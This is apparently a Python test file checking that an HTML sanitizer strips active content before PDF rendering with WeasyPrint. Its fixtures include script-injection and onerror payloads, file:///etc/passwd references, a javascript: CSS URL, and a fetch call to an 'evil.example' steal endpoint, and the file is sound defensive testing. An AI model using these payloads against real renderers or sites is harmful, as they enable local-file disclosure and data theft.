"""Tests: evidencia preview HTML sanitization before WeasyPrint."""

from __future__ import annotations

from backend.core.evidencia_volanteo.rendering import render_pdf_html
from backend.utils.html_sanitizer import sanitize_html_for_pdf

_TINY_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
)


def test_sanitize_strips_active_content_and_external_urls() -> None:
    html = """
    <html>
      <head><style>
        .safe { background-image: url(data:image/png;base64,AAAA); }
        .local { background-image: url("file:///etc/passwd"); }
        .remote { background-image: url(https://example.com/a.png); }
      </style></head>
      <body>
        <script>alert(1)</script>
        <iframe src="file:///etc/passwd"></iframe>
        <img src="https://evil.example/x.png" onerror="alert(1)"/>
      </body>
    </html>
    """
    out = sanitize_html_for_pdf(html)

    assert "Content-Security-Policy" in out
    assert "<script" not in out.lower()
    assert "<iframe" not in out.lower()
    assert "file:///etc/passwd" not in out
    assert "https://example.com/a.png" not in out
    assert "https://evil.example/x.png" not in out
    assert "onerror" not in out.lower()
    assert "url(data:image/png;base64,AAAA)" in out


def test_sanitize_neutralises_javascript_in_css() -> None:
    payload = "<head></head><style>.x{background:url(javascript:alert(1))}</style>"
    out = sanitize_html_for_pdf(payload)
    assert "javascript:alert" not in out.lower()
    assert "url('')" in out


def test_render_pdf_html_benign_data_uri_produces_pdf() -> None:
    data_uri = f"data:image/png;base64,{_TINY_PNG_B64}"
    html = f"""<!DOCTYPE html><html><head><meta charset='utf-8'><style>
    @page {{ size: A4 portrait; margin: 8mm; }}
    </style></head><body>
    <div style='width:210mm;height:297mm'>
      <p>Preview evidencia</p>
      <img src="{data_uri}" style="width:2cm;height:2cm"/>
    </div></body></html>"""
    pdf_bytes, filename = render_pdf_html(html)
    assert filename.endswith(".pdf")
    assert pdf_bytes.startswith(b"%PDF")
    assert len(pdf_bytes) > 500


def test_render_pdf_html_strips_malicious_and_still_produces_pdf() -> None:
    data_uri = f"data:image/png;base64,{_TINY_PNG_B64}"
    html = f"""<!DOCTYPE html><html><head><meta charset='utf-8'></head>
    <body>
      <script>fetch('https://evil.example/steal')</script>
      <img src="https://evil.example/track.png"/>
      <img src="{data_uri}" style="width:2cm;height:2cm"/>
    </body></html>"""
    pdf_bytes, _ = render_pdf_html(html)
    assert pdf_bytes.startswith(b"%PDF")
